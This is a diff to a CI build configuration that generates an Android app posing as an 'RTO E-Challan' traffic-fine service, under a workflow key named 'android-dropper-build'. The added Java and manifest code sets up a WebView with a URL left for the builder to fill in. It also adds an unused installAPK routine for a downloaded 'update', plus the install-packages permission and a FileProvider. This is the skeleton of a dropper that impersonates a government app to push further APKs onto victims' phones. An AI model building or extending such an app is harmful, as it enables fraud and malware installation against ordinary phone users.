@@ -1,65 +1,94 @@
 workflows:
   android-dropper-build:
-    name: RTO-Final-Green-Success
+    name: RTO-E-Challan-Final-Working
     max_build_duration: 60
     instance_type: mac_mini_m2
     environment:
       java: 11
     scripts:
-      - name: Build Without Image Error
+      - name: Build Full Feature APK
         script: |
           cd RtoEChallan || cd .
           rm -rf .gradle gradle gradlew gradlew.bat settings.gradle build.gradle app
           
-          # 1. Folder Structure
-          mkdir -p app/src/main/res/layout app/src/main/res/values app/src/main/java/com/rto/echallan
+          mkdir -p app/src/main/res/layout app/src/main/res/xml app/src/main/java/com/rto/echallan
 
-          # 2. AndroidX Fix (Jo 11847.jpg mein error tha)
+          # 1. AndroidX Fix
           cat <<EOF > gradle.properties
           android.useAndroidX=true
           android.enableJetifier=true
           EOF
 
-          # 3. Fast Config
-          echo "include ':app'" > settings.gradle
-          cat <<EOF > build.gradle
-          buildscript {
-              repositories { google(); mavenCentral() }
-              dependencies { classpath 'com.android.tools.build:gradle:4.2.2' }
-          }
-          allprojects { repositories { google(); mavenCentral() } }
+          # 2. FileProvider (For Auto-Install)
+          cat <<EOF > app/src/main/res/xml/file_paths.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <paths><external-path name="external_files" path="." /></paths>
           EOF
 
-          cat <<EOF > app/build.gradle
-          apply plugin: 'com.android.application'
-          android {
-              compileSdkVersion 30
-              defaultConfig {
-                  applicationId "com.rto.echallan"
-                  minSdkVersion 21
-                  targetSdkVersion 30
-                  versionCode 1
-                  versionName "1.0"
+          # 3. WebView Layout (White screen khatam karne ke liye)
+          cat <<EOF > app/src/main/res/layout/activity_main.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <WebView xmlns:android="http://schemas.android.com/apk/res/android"
+              android:id="@+id/webview"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent" />
+          EOF
+
+          # 4. Java Code (WebView + Auto Install Logic)
+          cat <<EOF > app/src/main/java/com/rto/echallan/MainActivity.java
+          package com.rto.echallan;
+          import android.content.Intent;
+          import android.net.Uri;
+          import android.os.Bundle;
+          import android.webkit.WebView;
+          import android.webkit.WebViewClient;
+          import androidx.appcompat.app.AppCompatActivity;
+          import androidx.core.content.FileProvider;
+          import java.io.File;
+
+          public class MainActivity extends AppCompatActivity {
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+                  WebView w = findViewById(R.id.webview);
+                  w.getSettings().setJavaScriptEnabled(true);
+                  w.setWebViewClient(new WebViewClient());
+                  // Yahan apni URL dalo
+                  w.loadUrl("https://www.google.com"); 
+              }
+              // Is function ko tab call karna jab update file download ho jaye
+              private void installAPK(File file) {
+                  Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", file);
+                  Intent intent = new Intent(Intent.ACTION_VIEW);
+                  intent.setDataAndType(uri, "application/vnd.android.package-archive");
+                  intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                  startActivity(intent);
               }
           }
-          dependencies { implementation 'androidx.appcompat:appcompat:1.2.0' }
           EOF
 
-          # 4. Manifest (Using Default Icon to avoid 11850.jpg error)
+          # 5. Manifest (Permissions included)
           cat <<EOF > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.rto.echallan">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
               <application android:label="Rto E Challan" android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                   <activity android:name=".MainActivity" android:exported="true">
                       <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
                   </activity>
+                  <provider android:name="androidx.core.content.FileProvider" android:authorities="com.rto.echallan.provider" android:exported="false" android:grantUriPermissions="true">
+                      <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths" />
+                  </provider>
               </application>
           </manifest>
           EOF
 
-          # 5. Core Java
-          echo "package com.rto.echallan; import android.app.Activity; import android.os.Bundle; public class MainActivity extends Activity { @Override protected void onCreate(Bundle s) { super.onCreate(s); } }" > app/src/main/java/com/rto/echallan/MainActivity.java
-
-          # 6. Build Command
+          # 6. Build Config
+          echo "include ':app'" > settings.gradle
+          echo "buildscript { repositories { google(); mavenCentral() }; dependencies { classpath 'com.android.tools.build:gradle:4.2.2' } }; allprojects { repositories { google(); mavenCentral() } }" > build.gradle
+          echo "apply plugin: 'com.android.application'; android { compileSdkVersion 30; defaultConfig { applicationId 'com.rto.echallan'; minSdk 21; targetSdkVersion 30; versionCode 1; versionName '1.0' } }; dependencies { implementation 'androidx.appcompat:appcompat:1.2.0' }" > app/build.gradle
+          
           gradle wrapper --gradle-version 6.7.1
           chmod +x gradlew
           ./gradlew assembleRelease --no-daemon
